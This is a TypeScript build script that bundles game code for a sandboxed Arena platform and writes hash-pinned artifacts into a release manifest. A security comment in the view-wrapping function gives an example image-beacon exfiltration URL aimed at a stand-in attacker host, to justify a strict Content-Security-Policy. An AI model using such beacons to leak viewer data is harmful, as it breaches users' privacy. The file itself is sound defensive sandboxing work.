/**
 * Publish step (runs on merge to main). For each game it:
 *   1. bundles the author entry into a single IIFE (esbuild) exposing
 *      `globalThis.__gameModule__.default` — the exact form the Arena sandbox loads
 *   2. computes a sha256 content-hash (pins the code a match runs against)
 *   3. writes dist/bundles/<slug>.js, dist/rules/<slug>.md
 * and finally writes dist/index.json — the manifest the Arena backend's
 * world-loader fetches to register + pull each pinned bundle.
 *
 * The Arena (private) backend pulls ONLY these built, hash-pinned artifacts —
 * it never imports author source. Run: `pnpm build:bundles`.
 */
import { readFile, readdir, writeFile, mkdir, rm } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { createHash } from 'node:crypto'
import path from 'node:path'
import esbuild from 'esbuild'
import type { GameDefinition, ParamSpec } from '@arena/game-sdk'
import { buildWorlds, readCover } from './build-worlds.js'

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const GAMES_DIR = path.join(ROOT, 'games')
const DIST = path.join(ROOT, 'dist')

/**
 * Ceiling on a game's cover, far below the world equivalent (400KB).
 *
 * A world's cover is one poster on a page that shows a handful of worlds. A
 * game's rides in an index entry that ALREADY carries the whole bundle and the
 * full rules text, and `GET /api/games` returns every registered game in one
 * response — so the covers are paid for together, by every visitor, on the
 * homepage. An SVG line drawing fits in single-digit KB; anything that does not
 * is a raster in disguise.
 *
 * Exported because `validate-games` enforces the same number in CI: a cap that
 * only lives here fails on main, in the publish job, where the author cannot fix it.
 */
export const MAX_GAME_COVER_BYTES = 64_000

/** Cards clamp the blurb to two lines; past this it is not a blurb. */
export const MAX_GAME_DESCRIPTION_CHARS = 160

interface Manifest {
  type: string
  displayName?: string
  sdkVersion?: string
  entry: string
  players: { min: number; max: number }
  pace: string
  /** One line, shown on the game's card and above its rules. */
  description?: string
  rules?: string
  /** Optional author T2 renderer; bundled into a sandboxed HTML doc. */
  view?: string
  /** `cover` is an SVG logo, inlined below as a data URI. */
  presentation?: { cover: string }
}

interface IndexEntry {
  type: string
  slug: string
  displayName: string
  pace: string
  /** All paces this game supports; a competition picks one via gameConfig.pace. */
  paces: string[]
  players: { min: number; max: number }
  sdkVersion: string
  contentHash: string
  bundle: string
  rules: string | null
  /** sha256 of `rulesMarkdown` — lets publish.yml's gate see rules-only edits. */
  rulesContentHash: string | null
  // Meta + params are published here so the Arena backend registers WITHOUT
  // running the sandbox at boot (introspection). The sandbox only runs per-match.
  maxSteps: number
  submitWindowSec: number | null
  turnTimeoutSec: number | null
  hiddenInfo: boolean
  params: Record<string, ParamSpec>
  // T2 sandboxed rendering: 'sandboxed' if the game ships a view, else 'declarative'.
  viewMode: 'declarative' | 'sandboxed'
  view: string | null
  viewContentHash: string | null
  // Inlined artifacts — the whole game travels INSIDE index.json so a release is a
  // single file (no per-file assets). The backend prefers these; `bundle`/`view`/
  // `rules` paths remain for local dir loads. contentHash is over `bundleCode`.
  bundleCode: string
  viewHtml: string | null
  rulesMarkdown: string | null
  // Presentation: what the Arena catalog shows before anyone opens a match.
  /** One-line blurb for the card. */
  description: string | null
  /** SVG logo as a data URI (inlined, like a world's cover). */
  cover: string | null
  /**
   * sha256 of `description` + `cover`.
   *
   * publish.yml's gate diffs a projection of each game entry to decide whether a
   * Release is worth cutting, and it cannot diff a field it does not select. With
   * only `contentHash` / `viewContentHash` / `rulesContentHash` in that
   * projection, redrawing a logo or rewriting a blurb changes nothing the gate
   * can see — the PR merges and never reaches production. Worlds hit this exact
   * wall and answered it with `releaseHash`; this is the same answer, scoped to
   * the fields games added.
   */
  metaContentHash: string | null
}

async function bundle(entryFile: string): Promise<string> {
  return (await bundleGameWithInputs(entryFile)).js
}

/**
 * The same bundle, plus the files that actually went into it.
 *
 * `validate-games` scans exactly this list rather than a directory. Scanning
 * `games/<slug>/src/` made the source gate OPT-IN: `entry` is only required to
 * exist, so a game whose logic sits at the package root, or under `lib/`, was
 * never checked for `Date.now` / `Math.random` / `eval` at all — and a game's
 * output becomes credits. esbuild's graph is the only definition of "the code
 * that settles a match" an author cannot step around. (This mirrors
 * `bundleWorldWithInputs`, where the same hole was closed first.)
 */
export async function bundleGameWithInputs(
  entryFile: string,
): Promise<{ js: string; inputs: string[] }> {
  const out = await esbuild.build({
    metafile: true,
    entryPoints: [entryFile],
    bundle: true,
    format: 'iife',
    globalName: '__gameModule__',
    platform: 'browser',
    target: 'es2022',
    legalComments: 'none',
    write: false,
    logLevel: 'silent',
  })
  const text = out.outputFiles?.[0]?.text
  if (!text) throw new Error(`esbuild produced no output for ${entryFile}`)
  // metafile keys are cwd-relative; resolve so a caller can read them from
  // wherever it was invoked.
  const inputs = Object.keys(out.metafile?.inputs ?? {}).map((p) => path.resolve(p))
  return { js: text, inputs }
}

/** Bundle an author view entry to inline JS (self-runs onFrame at load). */
export async function bundleView(entryFile: string): Promise<string> {
  const out = await esbuild.build({
    entryPoints: [entryFile],
    bundle: true,
    format: 'iife',
    platform: 'browser',
    target: 'es2022',
    legalComments: 'none',
    write: false,
    logLevel: 'silent',
  })
  const text = out.outputFiles?.[0]?.text
  if (!text) throw new Error(`esbuild produced no view output for ${entryFile}`)
  return text
}

/** Wrap author view JS in a self-contained, CSP-locked HTML doc (loaded into a sandbox iframe). */
export function viewHtml(js: string): string {
  // `</script` closes the element when followed by whitespace, `/` or `>`, so
  // matching the whole `</script>` missed `</script foo>` and `</script\n>` —
  // both of which end the tag early and spill the bundle into the document as
  // markup. Match the opening of the end tag and leave the terminator alone.
  const safe = js.replace(/<\/(script)/gi, '<\\/$1')
  // img-src is data: ONLY (no https:). An `<img src="https://attacker/?secret">`
  // beacon is an outbound channel out of the browser even though connect-src is
  // 'none' — the request still leaves with the URL, carrying the viewer's private
  // per-viewer frame. Locking img-src to data: closes that exfil path (#2031).
  // Views must inline any art as data: URIs; avatars are drawn by the host UI
  // outside the sandbox, not by author view code. The Arena frontend also injects
  // this same strict policy into the srcdoc as defense in depth.
  return `<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none'; frame-src 'none'; base-uri 'none'; form-action 'none'">
<style>html,body{margin:0;background:#0b0b0f;color:#e2e8f0;font:14px system-ui}</style>
</head><body><script>${safe}</script></body></html>`
}

async function main() {
  await rm(DIST, { recursive: true, force: true })
  await mkdir(path.join(DIST, 'bundles'), { recursive: true })
  await mkdir(path.join(DIST, 'rules'), { recursive: true })
  await mkdir(path.join(DIST, 'views'), { recursive: true })

  const entries: IndexEntry[] = []
  for (const d of await readdir(GAMES_DIR, { withFileTypes: true })) {
    if (!d.isDirectory()) continue
    const dir = path.join(GAMES_DIR, d.name)
    const manifestPath = path.join(dir, 'game.manifest.json')
    if (!existsSync(manifestPath)) continue

    const manifest = JSON.parse(await readFile(manifestPath, 'utf8')) as Manifest
    // Read meta + params by importing the game (no sandbox needed — just the object).
    const mod = (await import(path.join(dir, manifest.entry))) as { default: GameDefinition<unknown, Record<string, number>> }
    const meta = mod.default.meta
    const params = (mod.default.params ?? {}) as Record<string, ParamSpec>

    const code = await bundle(path.join(dir, manifest.entry))
    const contentHash = createHash('sha256').update(code).digest('hex')
    await writeFile(path.join(DIST, 'bundles', `${manifest.type}.js`), code, 'utf8')

    let rules: string | null = null
    let rulesMarkdown: string | null = null
    let rulesContentHash: string | null = null
    if (manifest.rules && existsSync(path.join(dir, manifest.rules))) {
      rulesMarkdown = await readFile(path.join(dir, manifest.rules), 'utf8')
      rulesContentHash = createHash('sha256').update(rulesMarkdown).digest('hex')
      rules = `rules/${manifest.type}.md`
      await writeFile(path.join(DIST, rules), rulesMarkdown, 'utf8')
    }

    // T2: bundle the author view (if any) into a sandboxed HTML doc.
    let view: string | null = null
    let viewContentHash: string | null = null
    let html: string | null = null
    if (manifest.view && existsSync(path.join(dir, manifest.view))) {
      html = viewHtml(await bundleView(path.join(dir, manifest.view)))
      viewContentHash = createHash('sha256').update(html).digest('hex')
      view = `views/${manifest.type}.html`
      await writeFile(path.join(DIST, view), html, 'utf8')
    }

    const description = manifest.description ?? null
    const cover = manifest.presentation?.cover
      ? await readCover(dir, manifest.presentation.cover, MAX_GAME_COVER_BYTES)
      : null

    entries.push({
      type: manifest.type,
      slug: d.name,
      displayName: manifest.displayName ?? manifest.type,
      pace: manifest.pace,
      paces: meta.paces ?? [manifest.pace],
      players: manifest.players,
      sdkVersion: manifest.sdkVersion ?? '0.0.0',
      contentHash,
      bundle: `bundles/${manifest.type}.js`,
      rules,
      rulesContentHash,
      maxSteps: meta.maxSteps ?? 10_000,
      submitWindowSec: meta.submitWindowSec ?? null,
      turnTimeoutSec: meta.turnTimeoutSec ?? null,
      hiddenInfo: meta.hiddenInfo ?? false,
      params,
      viewMode: view ? 'sandboxed' : 'declarative',
      view,
      viewContentHash,
      bundleCode: code,
      viewHtml: html,
      rulesMarkdown,
      description,
      cover,
      metaContentHash: createHash('sha256').update(`${description ?? ''}\n${cover ?? ''}`).digest('hex'),
    })
    console.log(`bundled ${manifest.type} (${(code.length / 1024).toFixed(1)}kb, ${contentHash.slice(0, 12)})${view ? ' + sandboxed view' : ''}`)
  }

  // Worlds ride the same index so a Release stays a single file and the backend
  // keeps one source of truth. They are a different KIND of artifact (no scored
  // logic, one self-contained document), not a different pipeline.
  const worlds = await buildWorlds(DIST)

  await writeFile(
    path.join(DIST, 'index.json'),
    JSON.stringify({ version: 1, games: entries, worlds }, null, 2),
    'utf8',
  )
  console.log(`\nwrote dist/index.json with ${entries.length} game(s) and ${worlds.length} world(s)`)
}

// Only run the full build when invoked directly (not when imported for viewHtml/bundleView).
if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((e) => {
    console.error(e)
    process.exit(1)
  })
}
